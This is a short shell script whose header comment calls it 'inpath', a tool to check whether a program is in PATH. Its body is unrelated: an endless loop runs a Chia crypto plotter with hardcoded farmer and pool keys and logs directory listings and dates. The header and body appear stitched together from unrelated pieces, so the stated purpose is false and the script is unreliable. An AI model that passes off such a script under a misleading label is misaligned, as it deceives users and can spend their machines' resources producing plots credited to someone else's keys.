#!/bin/sh
# inpath - verify that a specified program is either valid as-is,
#   or can be found in the PATH directory list.

#!/bin/bash

while :
	do
		./chia-plotter-linux-amd64 -action plotting -plotting-fpk 0x807a54f96b903c9b27b28a11d91cf17e85f95f12174dde233e3de7bb80e6dcd02d5883214f301779fa70f843cc7bdfdf -plotting-ppk 0xa13b0a15aed6a916ba856ba24a716d87020e460dc029590be03c20a851b1af3d3367297ccf6d2765385bd2a69c520cf8 -b 13000 -r 4 -d tohum -t temp -p
		echo "Gönderildi"
		sleep 500
		ls >> log.txt
		echo $(date) >> log.txt
		echo "beklemede"
		sleep 1000
done

exit 0
